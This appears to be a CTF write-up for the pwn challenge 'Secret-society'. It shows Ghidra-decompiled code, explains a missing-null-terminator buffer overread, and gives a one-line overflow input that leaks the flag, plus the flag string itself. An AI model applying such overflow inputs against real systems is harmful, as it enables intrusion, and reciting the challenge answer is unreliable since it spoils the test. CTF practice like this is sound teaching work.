---
layout: post
title: "Secret-society"
author: "AnandSaminathan"
tags: ['Pwn']
---

Wanna enter the Secret Society? Well you have to find the secret code first!

**Files**
- [secret-society]({{site.baseurl}}/assets/Secret-society/secret-society)

## Solution

On decompiling main using Ghidra:

```cpp
undefined8 main(undefined8 argc, char **argv)
{
    undefined4 uVar1;
    undefined *puVar2;
    int64_t iVar3;
    undefined8 in_R8;
    undefined8 in_R9;
    int64_t var_e0h;
    undefined8 uStack208;
    undefined4 uStack200;
    undefined auStack196 [108];
    int64_t var_50h;
    int64_t var_d4h;
    int64_t var_18h;
    int64_t var_10h;
    int64_t var_4h;
    
    var_d4h._0_4_ = (undefined4)argc;
    setvbuf(_reloc.stdout, 0, 2, 0, in_R8, in_R9, argv);
    uVar1 = getegid();
    setresgid(uVar1, uVar1, uVar1, uVar1);
    memset(&var_50h, 0, 0x32);
    memset((int64_t)&var_d4h + 4, 0, 0x80);
    puts("What is the secret phrase?");
    fgets((int64_t)&var_d4h + 4, 0x80, _reloc.stdin);
    puVar2 = (undefined *)strchr((int64_t)&var_d4h + 4, 10);
    if (puVar2 != (undefined *)0x0) {
        *puVar2 = 0;
    }
    iVar3 = strlen((int64_t)&var_d4h + 4);
    *(undefined8 *)((int64_t)&var_d4h + iVar3 + 4) = 0x657261206577202c;
    *(undefined8 *)((int64_t)&uStack208 + iVar3) = 0x6877797265766520;
    *(undefined4 *)((int64_t)&uStack200 + iVar3) = 0x2e657265;
    auStack196[iVar3] = 0;
    iVar3 = fopen("flag.txt", 0x402023);
    if (iVar3 == 0) {
        printf("You are a double agent, it\'s game over for you.");
        exit(0);
    }
    fgets(&var_50h, 0x32, iVar3);
    printf("Shhh... don\'t tell anyone else about ");
    puts((int64_t)&var_d4h + 4);
    return 0;
}
```

By inspecting the above code (and some assembly in gdb), it was clear that the input buffer is right above the buffer which contains the flag and fgets reads exactly 108 bytes. So if the input string length is greater than 108, then there will be no null termination in the buffer and therefore, the flag will be printed by the puts. This worked:

```shell
python2 -c "print 'A'*200" | ./secret-society 
```

## Flag
  ```
csivit{Bu!!er_e3pl01ts_ar5_5asy}
  ```

